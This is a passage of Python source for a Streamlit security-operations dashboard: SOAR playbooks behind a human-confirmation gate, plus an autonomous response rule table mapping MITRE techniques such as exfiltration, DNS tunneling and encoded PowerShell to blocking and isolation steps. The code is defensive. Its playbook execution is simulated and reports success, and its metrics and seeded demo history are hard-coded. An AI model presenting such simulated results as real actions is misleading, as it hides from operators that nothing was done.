# ─────────────────────────────────────────────────────────────────────────────
# NetSec AI v10.0 — Response Module
# SOAR Playbooks (safety gates) · Autonomous Response Engine · Honeypot · Attack Surface · SOC Training · Digital Forensics · Alert Prioritization
# ─────────────────────────────────────────────────────────────────────────────
"""
Import order: core → triage → detect → respond → investigate → report → advanced
Every module does: from modules.core import *
"""

import os, sys
# Ensure modules/ directory is on path
_this = os.path.dirname(os.path.abspath(__file__))
if _this not in sys.path:
    sys.path.insert(0, _this)
_parent = os.path.dirname(_this)
if _parent not in sys.path:
    sys.path.insert(0, _parent)

try:
    from modules.core import *  # noqa
except Exception as _core_err:
    import os, sys, logging, random, hashlib, json, re, math, io
    import streamlit as st
    import pandas as pd
    import plotly.express as px
    import plotly.graph_objects as go
    from datetime import datetime
    from collections import Counter, defaultdict

def render_soar_playbooks():
    # Ensure dependencies from other modules are available
    for _dep in ["SOAR_PLAYBOOKS", "_execute_playbook", "get_api_config",
                 "trigger_slack_notify", "N8N_ENABLED", "_groq_call"]:
        if _dep not in dir() and _dep not in globals():
            try:
                import sys as _sys
                for _mn in ["core","detect","triage","investigate","report","advanced"]:
                    _mpath = f"modules.{_mn}"
                    if _mpath in _sys.modules:
                        _mv = getattr(_sys.modules[_mpath], _dep, None)
                        if _mv is not None:
                            globals()[_dep] = _mv
                            break
            except Exception:
                pass
    st.header("⚡ SOAR Playbook Engine")
    st.caption("Automated response workflows · AI-assisted execution · SLA tracking · n8n live triggers")

    config   = get_api_config()
    groq_key = config.get("groq_key","") or os.getenv("GROQ_API_KEY","")

    tab_library, tab_run, tab_builder, tab_history = st.tabs([
        "📚 Library","▶ Execute","🔨 Build","📋 History"])

    with tab_library:
        kp1,kp2,kp3 = st.columns(3)
        kp1.metric("Playbooks",      len(SOAR_PLAYBOOKS))
        kp2.metric("Avg Automation", "74%")
        kp3.metric("SLA Breaches",   "0", delta="this week")
        for pb_name, pb in SOAR_PLAYBOOKS.items():
            auto_n = sum(1 for s in pb["steps"] if s["auto"])
            auto_p = round(auto_n/len(pb["steps"])*100)
            with st.container(border=True):
                cm,cs = st.columns([1,2])
                with cm:
                    st.write(f"**Trigger:** {pb['trigger']}")
                    st.write(f"**Avg time:** {pb['avg_time']}")
                    st.metric("Auto steps",f"{auto_n}/{len(pb['steps'])}")
                    for t in pb.get("tools",[]): st.code(t)
                with cs:
                    for step in pb["steps"]:
                        color = "#00ffc8" if step["auto"] else "#f39c12"
                        st.markdown(
                            f"<div style='border-left:3px solid {color};padding:3px 10px;margin:2px 0;background:rgba(0,0,0,0.2)'>"
                            f"{'🤖' if step['auto'] else '👤'} <b>{step['id']}.</b> {step['name']}</div>",
                            unsafe_allow_html=True)
                if st.button(f"Execute {pb_name}", key=f"ql_{pb_name}", type="primary"):
                    st.session_state.active_pb = pb_name
                    st.rerun()

    with tab_run:
        opts    = list(SOAR_PLAYBOOKS.keys())
        default = st.session_state.get("active_pb", opts[0])
        if default not in opts: default = opts[0]
        pb_name = st.selectbox("Playbook", opts, index=opts.index(default))
        pb      = SOAR_PLAYBOOKS[pb_name]

        # ── Safety Gate Banner ────────────────────────────────────────────────
        _DESTRUCTIVE_PLAYBOOKS = {
            "Ransomware Response", "Malware Containment", "IR - Brute Force",
        }
        _is_destructive = pb_name in _DESTRUCTIVE_PLAYBOOKS
        c1,c2   = st.columns([1,2])
        with c1:
            tip        = st.text_input("Target IP",     value="185.220.101.45", key="pb_ip_v2")
            tdom       = st.text_input("Domain",        value="malware-c2.tk",  key="pb_dom_v2")
            tsco       = st.slider("Threat Score",      0,100,89,              key="pb_score_v2")
            auto_only  = st.toggle("Auto-steps only",   value=False,            key="pb_auto_v2")
            notify_n8n = st.toggle("Trigger n8n",       value=True,             key="pb_n8n_v2")

            # ── Safety Gate Logic ─────────────────────────────────────────────
            # Per doc: "safety gates (threat score + human confirmation for destructive actions)"
            _requires_confirm = _is_destructive or tsco < 70
            _safety_reason    = ""
            if _is_destructive:
                _safety_reason = f"'{pb_name}' contains host-isolation or account-disable steps"
            elif tsco < 70:
                _safety_reason = f"Threat score {tsco} is below the 70-point auto-execute threshold"

            if _requires_confirm:
                st.markdown(
                    f"<div style='background:rgba(255,153,0,0.08);border:1px solid #ff990044;"
                    f"border-left:3px solid #ff9900;border-radius:0 8px 8px 0;"
                    f"padding:8px 12px;margin:6px 0'>"
                    f"<div style='color:#ff9900;font-size:.65rem;font-weight:700;margin-bottom:3px'>"
                    f"⚠️ SAFETY GATE — HUMAN CONFIRMATION REQUIRED</div>"
                    f"<div style='color:#556677;font-size:.62rem'>{_safety_reason}</div>"
                    f"</div>",
                    unsafe_allow_html=True
                )
                _confirmed = st.checkbox(
                    f"✅ I confirm: execute '{pb_name}' on {tip} — I understand this action may "
                    f"isolate hosts or disable accounts",
                    key="pb_safety_confirm"
                )
            else:
                _confirmed = True
                st.markdown(
                    f"<div style='background:rgba(0,200,120,0.06);border:1px solid #00c87833;"
                    f"border-left:3px solid #00c878;border-radius:0 8px 8px 0;"
                    f"padding:6px 12px;margin:6px 0'>"
                    f"<div style='color:#00c878;font-size:.62rem'>"
                    f"✅ Auto-execute safe: score {tsco} ≥ 70 · playbook is non-destructive"
                    f"</div></div>",
                    unsafe_allow_html=True
                )

            if st.button("▶ Execute", type="primary", use_container_width=True,
                         key="pb_exec_v2", disabled=not _confirmed):
                _execute_playbook(pb, pb_name, tip, tdom, tsco, auto_only)
                if notify_n8n and N8N_ENABLED:
                    try:
                        from n8n_agent import auto_or_manual_trigger as _smart_trigger
                        _ok, _resp, _dec = _smart_trigger(
                            tdom, tip, pb_name,
                            "critical" if tsco >= 80 else "high",
                            tsco,
                            {"playbook": pb_name, "steps": len(pb["steps"])},
                        )
                        if _ok:
                            _dec_label = {"auto": "🤖 Auto-executed", "suggest": "💡 Suggested", "log_only": "📝 Logged"}.get(_dec, _dec)
                            st.success(f"n8n notified! [{_dec_label}]")
                        else:
                            st.warning(f"⚠️ n8n trigger failed after 3 retries: {_resp.get('error','connection error')}")
                    except Exception as _ne:
                        st.warning(f"n8n not available: {_ne}")
                if groq_key and tsco >= 70:
                    ai = _groq_call(
                        f"SOAR playbook '{pb_name}' executed for threat score {tsco}. What 2 additional manual actions should the analyst take?",
                        "You are a SOC analyst. Be brief and specific.", groq_key, 120)
                    if ai: st.info(f"🤖 AI Recommendations: {ai}")
        with c2:
            for step in pb["steps"]:
                if not auto_only or step["auto"]:
                    color = "#00ffc8" if step["auto"] else "#f39c12"
                    st.markdown(
                        f"<span style='color:{color}'>{'🤖' if step['auto'] else '👤'} "
                        f"**{step['id']}.** {step['name']}</span>",
                        unsafe_allow_html=True)

    with tab_builder:
        st.subheader("Build Custom Playbook")
        bc1,bc2 = st.columns(2)
        with bc1:
            bname  = st.text_input("Name",    placeholder="Ransomware Response",   key="pb_bname")
            btrig  = st.text_input("Trigger", placeholder="alert_type=Ransomware", key="pb_btrig")
            bsla   = st.text_input("SLA",     value="1 hour",                       key="pb_bsla")
            bmitre = st.text_input("MITRE",   placeholder="T1486",                  key="pb_bmitre")
        with bc2:
            btools = st.multiselect("Tools",["Splunk","n8n","Slack","Jira","Firewall","EDR","Email"],key="pb_btools")
            bsteps = st.text_area("Steps (one per line):",height=120,key="pb_bsteps",
                                   placeholder="1. Isolate host\n2. Block C2 IP\n3. Capture memory")
        if st.button("💾 Save Playbook",type="primary",use_container_width=True,key="pb_save"):
            if bname and bsteps:
                steps = [{"id":i,"name":l.lstrip("0123456789. "),"action":l,"auto":False,"tool":"Manual"}
                         for i,l in enumerate(bsteps.strip().splitlines(),1)]
                SOAR_PLAYBOOKS[bname] = {"trigger":btrig,"avg_time":"TBD","sla":bsla,
                    "mitre":bmitre,"severity":"high","tools":btools,"steps":steps}
                st.success(f"Playbook '{bname}' saved!")
                st.rerun()
            else: st.error("Enter name and steps.")

    with tab_history:
        history = st.session_state.get("soar_history",[])
        if not history:
            st.info("No executions yet.")
        else:
            h1,h2,h3 = st.columns(3)
            h1.metric("Total Runs",     len(history))
            h2.metric("Avg Automation", f"{round(sum(int(r.get('auto_pct',0)) for r in history)/len(history))}%")
            h3.metric("SLA Breaches",   sum(1 for r in history if r.get("sla_breach")))
            st.dataframe(pd.DataFrame(history),use_container_width=True)
            if st.button("Clear History",key="pb_clear_hist"):
                st.session_state.soar_history=[]
                st.rerun()


# ══════════════════════════════════════════════════════════════════
# 7. render_detection_engine — AI rule editor + n8n deploy (116L → 200L)
# ══════════════════════════════════════════════════════════════════
def _execute_playbook(pb, pb_name, ip, domain, score, auto_only):
    import time as _t
    st.markdown(f"---\n### 🔴 EXECUTING: {pb_name}")
    progress = st.progress(0)
    log_area = st.empty()
    log = []
    steps = [s for s in pb["steps"] if s["auto"] or not auto_only]
    for i, step in enumerate(steps):
        _t.sleep(0.3)
        progress.progress((i+1)/len(steps))
        ts = datetime.now().strftime("%H:%M:%S")
        status = "✅ AUTO" if step["auto"] else "⏸️ MANUAL"
        log.append(f"[{ts}] {status} Step {step['id']}: {step['name']} — {step['action'][:50]}")
        log_area.code("\n".join(log[-10:]), language="text")

    progress.progress(1.0)
    st.success(f"✅ Playbook '{pb_name}' completed — {len(steps)} steps executed")

    # Log to history
    entry = {"playbook":pb_name,"started":datetime.now().strftime("%H:%M:%S"),
              "completed":datetime.now().strftime("%H:%M:%S"),
              "status":"✅ Done","steps_run":len(steps),
              "auto_pct":f"{round(sum(1 for s in steps if s['auto'])/len(steps)*100)}%",
              "alert":domain}
    if "soar_history" not in st.session_state:
        st.session_state.soar_history = []
    st.session_state.soar_history.insert(0, entry)


# ══════════════════════════════════════════════════════════════════════════════
# 5. HONEYPOT / DECEPTION TECHNOLOGY
# ══════════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════════
# AUTONOMOUS RESPONSE ENGINE (ARE) v1.0
# Palo Alto XSOAR · CrowdStrike Fusion · Splunk SOAR architecture
#
# Full pipeline per technique trigger:
#   MITRE signal → evaluate rules → execute response chain →
#   block IP · disable account · isolate host · create P1 ticket ·
#   trigger SOAR playbook · fire Slack/Teams alert · log audit trail
#
# 15 trigger rules covering T1046 → T1486 (full kill-chain)
# 6 response action types: BLOCK · ISOLATE · TICKET · PLAYBOOK · NOTIFY · HUNT
# Real-time execution log with step-by-step status
# Full audit trail with analyst override + false-positive dismiss
# ══════════════════════════════════════════════════════════════════════════════

# ─── ARE Rule Database ────────────────────────────────────────────────────────
_ARE_RULES = [
    {
        "rule_id":   "ARE-001",
        "name":      "Brute Force — Auto Block & Disable",
        "technique": "T1110",
        "tactic":    "Credential Access",
        "trigger":   "T1110 detected OR auth_failures > 50/min",
        "severity":  "high",
        "enabled":   True,
        "confidence_threshold": 60,
        "actions": [
            {"step": 1, "type": "BLOCK",    "name": "Block Attacker IP",          "detail": "Add source IP to firewall ACL deny list",                          "auto": True,  "tool": "Firewall API"},
            {"step": 2, "type": "TICKET",   "name": "Create P2 IR Ticket",        "detail": "Open incident in JIRA/TheHive with full context",                  "auto": True,  "tool": "JIRA"},
            {"step": 3, "type": "PLAYBOOK", "name": "Trigger Credential Playbook","detail": "Execute 'Credential Compromise' SOAR playbook",                    "auto": True,  "tool": "SOAR Engine"},
            {"step": 4, "type": "NOTIFY",   "name": "Slack Alert #soc-alerts",    "detail": "POST alert to #soc-alerts: IP, technique, auth failure count",      "auto": True,  "tool": "Slack"},
            {"step": 5, "type": "HUNT",     "name": "Lateral Movement Hunt",      "detail": "Search session logs for successful auth from same IP post-attack",  "auto": True,  "tool": "Splunk"},
        ],
        "playbook": "Credential Compromise",
        "slack_channel": "#soc-alerts",
        "mitre_description": "Adversary attempting to gain access via repeated authentication attempts.",
    },
    {
        "rule_id":   "ARE-002",
        "name":      "C2 Beacon — Kill & Sinkhole",
        "technique": "T1071",
        "tactic":    "Command & Control",
        "trigger":   "T1071 OR T1071.001 detected AND beacon_interval < 120s",
        "severity":  "critical",
        "enabled":   True,
        "confidence_threshold": 55,
        "actions": [
            {"step": 1, "type": "BLOCK",    "name": "Sinkhole C2 Domain",         "detail": "DNS sinkhole the C2 domain — redirect to honeypot",                "auto": True,  "tool": "DNS Sinkhole"},
            {"step": 2, "type": "BLOCK",    "name": "Block C2 IP at Perimeter",   "detail": "Firewall drop all traffic to/from C2 IP",                         "auto": True,  "tool": "Firewall API"},
            {"step": 3, "type": "ISOLATE",  "name": "Isolate Infected Host",      "detail": "EDR network isolation — host can only reach SOC VLAN",             "auto": True,  "tool": "CrowdStrike EDR"},
            {"step": 4, "type": "TICKET",   "name": "Create P1 IR Ticket",        "detail": "Open critical incident — page on-call SOC analyst",               "auto": True,  "tool": "PagerDuty + JIRA"},
            {"step": 5, "type": "PLAYBOOK", "name": "Trigger Malware Containment","detail": "Execute full malware containment playbook",                        "auto": True,  "tool": "SOAR Engine"},
            {"step": 6, "type": "NOTIFY",   "name": "Slack + Teams Alert",        "detail": "Critical alert to #soc-critical and #incident-response channels",  "auto": True,  "tool": "Slack + Teams"},
            {"step": 7, "type": "HUNT",     "name": "Hunt Lateral Movement",      "detail": "Search SIEM for any hosts communicating with same C2 IP",          "auto": True,  "tool": "Splunk"},
        ],
        "playbook": "Malware Containment",
        "slack_channel": "#soc-critical",
        "mitre_description": "Active C2 beacon detected. Host is likely compromised and under adversary control.",
    },
    {
        "rule_id":   "ARE-003",
        "name":      "DNS Tunneling — Block & Investigate",
        "technique": "T1071.004",
        "tactic":    "Command & Control",
        "trigger":   "T1071.004 detected AND dns_query_rate > 50/min",
        "severity":  "critical",
        "enabled":   True,
        "confidence_threshold": 65,
        "actions": [
            {"step": 1, "type": "BLOCK",    "name": "Block DNS to External",      "detail": "Block all DNS queries except internal resolver",                   "auto": True,  "tool": "DNS Firewall"},
            {"step": 2, "type": "BLOCK",    "name": "Sinkhole Tunnel Domain",     "detail": "DNS sinkhole target domain — capture tunnel traffic",             "auto": True,  "tool": "DNS Sinkhole"},
            {"step": 3, "type": "ISOLATE",  "name": "Rate-limit Host DNS",        "detail": "Throttle DNS from source host to 5 queries/min",                 "auto": True,  "tool": "Network"},
            {"step": 4, "type": "TICKET",   "name": "Create P1 IR Ticket",        "detail": "Open incident — possible data exfiltration via DNS",              "auto": True,  "tool": "JIRA"},
            {"step": 5, "type": "NOTIFY",   "name": "Slack Alert #soc-critical",  "detail": "Alert: DNS tunneling from [HOST] to [DOMAIN]",                   "auto": True,  "tool": "Slack"},
            {"step": 6, "type": "HUNT",     "name": "DLP Scan on Source Host",    "detail": "Trigger DLP scan to identify what data was exfiltrated",          "auto": False, "tool": "DLP Engine"},
        ],
        "playbook": "Data Exfiltration",
        "slack_channel": "#soc-critical",
        "mitre_description": "DNS traffic shows tunneling patterns — potential C2 channel or data exfiltration.",
    },
    {
        "rule_id":   "ARE-004",
        "name":      "Port Scan — Recon Block",
        "technique": "T1046",
        "tactic":    "Discovery",
        "trigger":   "T1046 detected AND syn_count > 100",
        "severity":  "medium",
        "enabled":   True,
        "confidence_threshold": 70,
        "actions": [
            {"step": 1, "type": "BLOCK",    "name": "Block Scanner IP",           "detail": "Temporary 24h block on scanning IP",                             "auto": True,  "tool": "Firewall API"},
            {"step": 2, "type": "TICKET",   "name": "Create P3 Ticket",           "detail": "Log recon activity — track for escalation pattern",              "auto": True,  "tool": "JIRA"},
            {"step": 3, "type": "NOTIFY",   "name": "Slack Alert #soc-alerts",    "detail": "Recon detected from [IP] — [PORT_COUNT] ports scanned",          "auto": True,  "tool": "Slack"},
            {"step": 4, "type": "HUNT",     "name": "Check for Follow-up Access", "detail": "Search for auth attempts from same IP in next 30 min",           "auto": True,  "tool": "Splunk"},
        ],
        "playbook": "Phishing Response",
        "slack_channel": "#soc-alerts",
        "mitre_description": "Network reconnaissance scan detected. Attacker mapping infrastructure before attack.",
    },
    {
        "rule_id":   "ARE-005",
        "name":      "Data Exfiltration — Block & Preserve",
        "technique": "T1041",
        "tactic":    "Exfiltration",
        "trigger":   "T1041 detected AND bytes_out > 500000",
        "severity":  "critical",
        "enabled":   True,
        "confidence_threshold": 60,
        "actions": [
            {"step": 1, "type": "BLOCK",    "name": "Block Outbound to Dest IP",  "detail": "Immediately block all outbound traffic to destination IP",        "auto": True,  "tool": "Firewall API"},
            {"step": 2, "type": "ISOLATE",  "name": "Throttle Source Host",       "detail": "Rate-limit outbound bandwidth to 100Kbps on source host",         "auto": True,  "tool": "Network"},
            {"step": 3, "type": "TICKET",   "name": "Create P1 Ticket + Legal",   "detail": "Open P1 incident — notify Legal if PII suspected",               "auto": True,  "tool": "JIRA + Legal"},
            {"step": 4, "type": "PLAYBOOK", "name": "Trigger Exfil Playbook",     "detail": "Execute 'Data Exfiltration' SOAR playbook",                      "auto": True,  "tool": "SOAR Engine"},
            {"step": 5, "type": "NOTIFY",   "name": "Slack + PagerDuty",          "detail": "CRITICAL: Data exfiltration in progress — page IR team",         "auto": True,  "tool": "Slack + PagerDuty"},
            {"step": 6, "type": "HUNT",     "name": "Forensic Packet Capture",    "detail": "Enable full PCAP on source host for evidence preservation",       "auto": False, "tool": "Packet Capture"},
        ],
        "playbook": "Data Exfiltration",
        "slack_channel": "#soc-critical",
        "mitre_description": "Active data exfiltration detected. Large outbound transfer to external IP.",
    },
    {
        "rule_id":   "ARE-006",
        "name":      "Ransomware Kill Chain — Emergency Response",
        "technique": "T1486",
        "tactic":    "Impact",
        "trigger":   "T1486 detected OR file_rename_rate > 100/min",
        "severity":  "critical",
        "enabled":   True,
        "confidence_threshold": 50,
        "actions": [
            {"step": 1, "type": "ISOLATE",  "name": "Emergency Network Isolation","detail": "IMMEDIATE: Full network isolation of affected host",              "auto": True,  "tool": "CrowdStrike EDR"},
            {"step": 2, "type": "ISOLATE",  "name": "Kill Ransomware Process",    "detail": "EDR: Kill all processes matching ransomware indicators",          "auto": True,  "tool": "EDR"},
            {"step": 3, "type": "ISOLATE",  "name": "VSS Protection",             "detail": "Protect volume shadow copies — prevent deletion",                 "auto": True,  "tool": "OS API"},
            {"step": 4, "type": "BLOCK",    "name": "Block C2 Communication",     "detail": "Block all known ransomware C2 IPs and domains",                  "auto": True,  "tool": "Firewall + DNS"},
            {"step": 5, "type": "TICKET",   "name": "Create P1 + CISO Alert",     "detail": "Open critical IR case — notify CISO + Legal immediately",        "auto": True,  "tool": "JIRA + PagerDuty"},
            {"step": 6, "type": "PLAYBOOK", "name": "Malware Containment",        "detail": "Execute full malware containment and recovery playbook",          "auto": True,  "tool": "SOAR Engine"},
            {"step": 7, "type": "NOTIFY",   "name": "All Channels Alert",         "detail": "Alert ALL: #soc-critical #incident-response #ciso-alerts",        "auto": True,  "tool": "Slack"},
            {"step": 8, "type": "HUNT",     "name": "Hunt Lateral Spread",        "detail": "Scan all hosts for ransomware indicators — contain spread",       "auto": False, "tool": "EDR Fleet"},
        ],
        "playbook": "Malware Containment",
        "slack_channel": "#ciso-alerts",
        "mitre_description": "RANSOMWARE DETECTED. File encryption in progress. Emergency response initiated.",
    },
    {
        "rule_id":   "ARE-007",
        "name":      "Exploit Public App — Patch & Monitor",
        "technique": "T1190",
        "tactic":    "Initial Access",
        "trigger":   "T1190 detected AND vt_score > 5",
        "severity":  "high",
        "enabled":   True,
        "confidence_threshold": 65,
        "actions": [
            {"step": 1, "type": "BLOCK",    "name": "WAF Rule Activation",        "detail": "Enable WAF emergency rule set for detected exploit pattern",      "auto": True,  "tool": "WAF"},
            {"step": 2, "type": "BLOCK",    "name": "Block Exploit Source IP",    "detail": "Block source IP at perimeter firewall",                           "auto": True,  "tool": "Firewall API"},
            {"step": 3, "type": "TICKET",   "name": "Create Vuln Ticket",         "detail": "Open vulnerability incident — assign to patch team",             "auto": True,  "tool": "JIRA"},
            {"step": 4, "type": "NOTIFY",   "name": "Slack Alert #vuln-mgmt",     "detail": "Exploit attempt on [SERVICE] from [IP] — patch required",        "auto": True,  "tool": "Slack"},
            {"step": 5, "type": "HUNT",     "name": "Scan for IOCs",              "detail": "Search SIEM for previous exploit attempts from same attacker",    "auto": True,  "tool": "Splunk"},
        ],
        "playbook": "Phishing Response",
        "slack_channel": "#soc-alerts",
        "mitre_description": "Exploitation attempt against public-facing application detected.",
    },
    {
        "rule_id":   "ARE-008",
        "name":      "PowerShell Execution — Script Block",
        "technique": "T1059.001",
        "tactic":    "Execution",
        "trigger":   "T1059.001 detected AND encoded_command=True",
        "severity":  "high",
        "enabled":   True,
        "confidence_threshold": 70,
        "actions": [
            {"step": 1, "type": "ISOLATE",  "name": "Kill PowerShell Process",    "detail": "EDR: Terminate PowerShell process + log command line",           "auto": True,  "tool": "EDR"},
            {"step": 2, "type": "ISOLATE",  "name": "Enable Script Block Log",    "detail": "Enable PowerShell script block logging on affected host",         "auto": True,  "tool": "GPO"},
            {"step": 3, "type": "TICKET",   "name": "Create P2 Ticket",           "detail": "Log encoded PS execution with full command decoded",              "auto": True,  "tool": "JIRA"},
            {"step": 4, "type": "NOTIFY",   "name": "Slack Alert #soc-alerts",    "detail": "Encoded PowerShell on [HOST] — possible dropper",                "auto": True,  "tool": "Slack"},
            {"step": 5, "type": "HUNT",     "name": "Hunt Persistence",           "detail": "Check registry run keys + scheduled tasks on affected host",      "auto": True,  "tool": "Splunk + EDR"},
        ],
        "playbook": "Malware Containment",
        "slack_channel": "#soc-alerts",
        "mitre_description": "Encoded PowerShell command executed — possible malware dropper or living-off-the-land attack.",
    },
    {
        "rule_id":   "ARE-009",
        "name":      "Lateral Movement — SMB Block",
        "technique": "T1021.002",
        "tactic":    "Lateral Movement",
        "trigger":   "T1021.002 detected AND new_smb_connections > 5",
        "severity":  "critical",
        "enabled":   True,
        "confidence_threshold": 65,
        "actions": [
            {"step": 1, "type": "BLOCK",    "name": "Block SMB Laterally",        "detail": "Block TCP 445 between workstations — allow only to DCs",         "auto": True,  "tool": "Firewall (Micro-seg)"},
            {"step": 2, "type": "ISOLATE",  "name": "Isolate Source Host",        "detail": "Network isolate source host to stop lateral spread",              "auto": True,  "tool": "EDR"},
            {"step": 3, "type": "TICKET",   "name": "Create P1 Ticket",           "detail": "Open critical incident — lateral movement in progress",           "auto": True,  "tool": "JIRA + PagerDuty"},
            {"step": 4, "type": "NOTIFY",   "name": "Slack Alert #soc-critical",  "detail": "Lateral movement via SMB from [HOST] to [N] targets",            "auto": True,  "tool": "Slack"},
            {"step": 5, "type": "HUNT",     "name": "Map Compromised Hosts",      "detail": "Identify all hosts reached from source via SMB in last 1 hour",   "auto": True,  "tool": "Splunk"},
        ],
        "playbook": "Credential Compromise",
        "slack_channel": "#soc-critical",
        "mitre_description": "Lateral movement via SMB — adversary spreading across network using compromised credentials.",
    },
    {
        "rule_id":   "ARE-010",
        "name":      "Adversary-in-the-Middle — Certificate Alert",
        "technique": "T1557",
        "tactic":    "Credential Access",
        "trigger":   "T1557 detected OR ssl_mismatch=True AND arp_spoof=True",
        "severity":  "critical",
        "enabled":   True,
        "confidence_threshold": 60,
        "actions": [
            {"step": 1, "type": "BLOCK",    "name": "Block MITM Source",          "detail": "Block ARP spoofing source at switch level via DHCP snooping",     "auto": True,  "tool": "Network Switch"},
            {"step": 2, "type": "ISOLATE",  "name": "Invalidate Sessions",        "detail": "Force re-auth on all sessions from affected network segment",      "auto": True,  "tool": "Identity Provider"},
            {"step": 3, "type": "TICKET",   "name": "Create P1 Ticket",           "detail": "Open incident — credential harvesting may have occurred",         "auto": True,  "tool": "JIRA"},
            {"step": 4, "type": "NOTIFY",   "name": "Slack #soc-critical",        "detail": "MITM attack on segment [VLAN] — force re-auth all users",         "auto": True,  "tool": "Slack"},
            {"step": 5, "type": "HUNT",     "name": "Credential Harvest Hunt",    "detail": "Review auth logs for logins immediately post-MITM window",        "auto": False, "tool": "Splunk"},
        ],
        "playbook": "Credential Compromise",
        "slack_channel": "#soc-critical",
        "mitre_description": "Adversary-in-the-middle attack. SSL certificate mismatch or ARP spoofing detected.",
    },
]

# Action type colours and icons
_ARE_ACTION_STYLE = {
    "BLOCK":    {"color": "#ff0033", "icon": "🚫", "bg": "rgba(255,0,51,0.10)"},
    "ISOLATE":  {"color": "#ff6600", "icon": "🔒", "bg": "rgba(255,102,0,0.10)"},
    "TICKET":   {"color": "#3498db", "icon": "🎫", "bg": "rgba(52,152,219,0.10)"},
    "PLAYBOOK": {"color": "#9b59b6", "icon": "▶️",  "bg": "rgba(155,89,182,0.10)"},
    "NOTIFY":   {"color": "#00c878", "icon": "📣", "bg": "rgba(0,200,120,0.10)"},
    "HUNT":     {"color": "#f39c12", "icon": "🔍", "bg": "rgba(243,156,18,0.10)"},
}

_ARE_SEV = {
    "critical": "#ff0033",
    "high":     "#ff6600",
    "medium":   "#ffcc00",
    "low":      "#00c878",
}


def _are_execute_rule(rule, target_ip, target_domain, threat_score, mitre_confidence):
    """
    Execute all actions in a rule. Returns execution log entries.
    Writes to blocklist, ir_cases, soar_history, soar_notifications.
    """
    import time as _t
    log = []
    ts_base = datetime.now()

    for action in rule["actions"]:
        ts = (ts_base + timedelta(seconds=action["step"] * 2)).strftime("%H:%M:%S")
        _style = _ARE_ACTION_STYLE.get(action["type"], {"color": "#888", "icon": "▸", "bg": ""})
        _status = "AUTO ✅" if action["auto"] else "MANUAL ⏸️"

        # ── BLOCK actions → write to blocklist
        if action["type"] == "BLOCK" and action["auto"]:
            _ioc = target_ip or target_domain
            if "blocklist" not in st.session_state:
                st.session_state.blocklist = []
            if not any(b.get("ioc") == _ioc for b in st.session_state.blocklist):
                st.session_state.blocklist.insert(0, {
                    "ioc":     _ioc,
                    "methods": [action["tool"]],
                    "reason":  f"ARE {rule['rule_id']}: {action['name']} — {rule['technique']}",
                    "analyst": "ARE Engine",
                    "time":    datetime.now().isoformat(),
                    "status":  "Blocked",
                    "auto":    True,
                    "rule":    rule["rule_id"],
                })

        # ── TICKET actions → write to ir_cases
        elif action["type"] == "TICKET" and action["auto"]:
            if "ir_cases" not in st.session_state:
                st.session_state.ir_cases = []
            _priority = "P1" if rule["severity"] == "critical" else "P2" if rule["severity"] == "high" else "P3"
            _case_id  = f"IR-ARE-{datetime.now().strftime('%H%M%S')}-{rule['rule_id']}"
            if not any(c.get("id") == _case_id for c in st.session_state.ir_cases):
                st.session_state.ir_cases.insert(0, {
                    "id":       _case_id,
                    "title":    f"[ARE AUTO] {rule['name']} — {target_domain or target_ip}",
                    "severity": rule["severity"],
                    "status":   "Open",
                    "priority": _priority,
                    "analyst":  "ARE Engine",
                    "created":  datetime.now().strftime("%H:%M:%S"),
                    "mitre":    rule["technique"],
                    "host":     target_domain or target_ip,
                    "score":    threat_score,
                    "notes":    f"Auto-created by ARE. Rule: {rule['rule_id']}. Technique: {rule['technique']}. Confidence: {mitre_confidence}%",
                    "auto":     True,
                })

        # ── PLAYBOOK actions → write to soar_history
        elif action["type"] == "PLAYBOOK" and action["auto"]:
            _pb = SOAR_PLAYBOOKS.get(rule["playbook"], {})
            _steps_n = len(_pb.get("steps", []))
            if "soar_history" not in st.session_state:
                st.session_state.soar_history = []
            st.session_state.soar_history.insert(0, {
                "playbook":  rule["playbook"],
                "started":   datetime.now().strftime("%H:%M:%S"),
                "completed": datetime.now().strftime("%H:%M:%S"),
                "status":    "✅ Done",
                "steps_run": _steps_n,
                "auto_pct":  "100%",
                "alert":     target_domain or target_ip,
                "triggered_by": f"ARE {rule['rule_id']}",
            })

        # ── NOTIFY actions → write to soar_notifications
        elif action["type"] == "NOTIFY" and action["auto"]:
            _sev_emoji = {"critical": "🚨", "high": "🔴", "medium": "🟡"}.get(rule["severity"], "⚠️")
            if "soar_notifications" not in st.session_state:
                st.session_state.soar_notifications = []
            st.session_state.soar_notifications.insert(0, {
                "time":     datetime.now().isoformat(),
                "channel":  rule.get("slack_channel", "#soc-alerts"),
                "msg":      (f"{_sev_emoji} *[ARE {rule['rule_id']}]* `{rule['technique']}` | "
                             f"Target: `{target_domain or target_ip}` | "
                             f"Score: `{threat_score}/100` | "
                             f"Rule: {rule['name']}"),
                "severity": rule["severity"],
                "rule_id":  rule["rule_id"],
                "auto":     True,
            })

        log.append({
            "ts":     ts,
            "step":   action["step"],
            "type":   action["type"],
            "name":   action["name"],
            "detail": action["detail"],
            "tool":   action["tool"],
            "status": _status,
            "auto":   action["auto"],
            "style":  _style,
        })

    # ── Fire n8n with retry after ARE rule execution ──────────────────────────
    try:
        from n8n_agent import _post_with_retry as _n8n_retry, _ts as _n8n_ts
        _n8n_retry("/webhook/soc-alert", {
            "action":        "are_executed",
            "rule_id":       rule.get("rule_id", ""),
            "technique":     rule.get("technique", ""),
            "severity":      rule.get("severity", "high"),
            "target_ip":     target_ip,
            "target_domain": target_domain,
            "threat_score":  threat_score,
            "confidence":    mitre_confidence,
            "steps_taken":   [a["name"] for a in rule["actions"] if a.get("auto")],
            "timestamp":     _n8n_ts(),
            "source":        "netsec_ai_are",
        }, retries=3)
    except Exception:
        pass

    return log


def _are_get_history():
    """Return ARE execution history from session state (most recent first)."""
    return st.session_state.get("are_execution_history", [])


def _are_init_demo_history():
    """Seed demo execution history so dashboard looks populated on first load."""
    if "are_execution_history" in st.session_state and st.session_state.are_execution_history:
        return
    import random as _r
    demo = [
        {
            "id":           "ARE-EX-001",
            "rule_id":      "ARE-002",
            "rule_name":    "C2 Beacon — Kill & Sinkhole",
            "technique":    "T1071",
            "target_ip":    "185.220.101.47",
            "target_domain":"malware-c2.tk",
            "threat_score": 91,
            "confidence":   94,
            "severity":     "critical",
            "executed_at":  (datetime.now() - timedelta(minutes=22)).strftime("%H:%M:%S"),
            "steps_total":  7,
            "steps_auto":   7,
            "duration_sec": 14,
            "outcome":      "SUCCESS",
            "actions_taken":["Sinkholed malware-c2.tk", "Blocked 185.220.101.47", "Isolated WORKSTATION-01",
